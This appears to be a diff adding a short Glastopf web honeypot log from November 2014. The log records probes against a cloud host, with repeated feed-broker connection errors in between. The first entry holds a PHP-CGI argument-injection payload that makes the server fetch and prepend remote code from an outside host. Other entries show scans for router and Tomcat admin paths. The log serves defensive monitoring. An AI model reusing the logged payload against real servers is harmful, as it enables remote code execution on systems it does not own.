@@ -1,0 +1,22 @@
+2014-11-01 05:07:41,223 (glastopf.glastopf) 66.7.197.35 requested POST /?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp://websiteongo.com/wordpress/wp-includes/images/api.gif%20-n/?-d%20allow_url_include%3DOn+-d%20auto_prepend_file%3Dhttp://websiteongo.com/wordpress/wp-includes/images/api.gif%20-n on ip-10-239-45-35.ec2.internal:80
+2014-11-01 05:07:41,383 (pyhpfeeds) Socket error: [Errno 110] Connection timed out
+2014-11-01 05:07:41,383 (pyhpfeeds) Disconnected from broker (in publish).
+2014-11-01 05:07:41,384 (pyhpfeeds) connecting to hpfriends.honeycloud.net:20000
+2014-11-01 05:07:41,868 (pyhpfeeds) info message name: hpfriends, rand: 'cP\x91\x89'
+2014-11-01 07:07:24,601 (glastopf.glastopf) 175.156.48.189 requested GET /tmUnblock.cgi on ip-10-239-45-35.ec2.internal:80
+2014-11-01 07:07:25,091 (glastopf.glastopf) 175.156.48.189 requested POST /tmUnblock.cgi on ip-10-239-45-35.ec2.internal:80
+2014-11-01 17:22:14,257 (glastopf.glastopf) 217.31.48.30 requested HEAD /rom-0 on ip-10-239-45-35.ec2.internal:80
+2014-11-01 17:22:14,314 (pyhpfeeds) Socket error: [Errno 110] Connection timed out
+2014-11-01 17:22:14,314 (pyhpfeeds) Disconnected from broker (in publish).
+2014-11-01 17:22:14,314 (pyhpfeeds) connecting to hpfriends.honeycloud.net:20000
+2014-11-01 17:22:15,007 (pyhpfeeds) info message name: hpfriends, rand: '\x98\x0b\xa7\xa2'
+2014-11-01 22:01:32,086 (glastopf.glastopf) 117.21.225.165 requested GET /manager/html on ip-10-239-45-35.ec2.internal:80
+2014-11-01 22:01:32,155 (pyhpfeeds) Socket error: [Errno 110] Connection timed out
+2014-11-01 22:01:32,156 (pyhpfeeds) Disconnected from broker (in publish).
+2014-11-01 22:01:32,156 (pyhpfeeds) connecting to hpfriends.honeycloud.net:20000
+2014-11-01 22:01:32,635 (pyhpfeeds) info message name: hpfriends, rand: '\x13\x92\xb6\xe4'
+2014-11-01 23:49:24,051 (glastopf.glastopf) 192.3.196.113 requested GET /phppath/php on ip-10-239-45-35.ec2.internal:80
+2014-11-01 23:49:24,104 (pyhpfeeds) Socket error: [Errno 110] Connection timed out
+2014-11-01 23:49:24,105 (pyhpfeeds) Disconnected from broker (in publish).
+2014-11-01 23:49:24,105 (pyhpfeeds) connecting to hpfriends.honeycloud.net:20000
+2014-11-01 23:49:24,560 (pyhpfeeds) info message name: hpfriends, rand: '9\xe87\x81'
